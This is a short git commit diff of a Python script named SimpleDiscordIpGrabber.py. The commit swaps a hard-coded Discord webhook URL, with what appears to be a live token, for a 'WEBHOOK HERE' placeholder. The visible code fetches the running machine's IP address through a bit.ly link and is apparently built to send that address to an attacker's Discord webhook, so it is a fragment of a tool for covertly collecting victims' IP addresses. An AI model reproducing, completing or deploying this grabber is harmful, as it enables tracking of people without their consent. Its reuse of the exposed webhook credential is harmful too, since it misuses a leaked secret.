385533c82cf4562a178a01bc7b55cbfef9b0172c
Fano <77120846+anonfano@users.noreply.github.com>
2022-07-24 17:14:44 +0200

    Update SimpleDiscordIpGrabber.py

--- SimpleDiscordIpGrabber.py
+++ SimpleDiscordIpGrabber.py
@@ -3,7 +3,7 @@ from base64 import b64decode
 from discord_webhook import DiscordWebhook
 from urllib.request import Request, urlopen
 
-webhookurl = 'https://discord.com/api/webhooks/999301480051920916/Iyr6Tb7Vx22vK0KXaZcBLhInoIYKGzTlmSDxzYXfOA_fFpNVcby8VsoeOCyXOPov7-wh'
+webhookurl = 'WEBHOOK HERE'
 
 ip = urlopen(Request("https://bit.ly/2PTxfFq")).read().decode().strip()
 
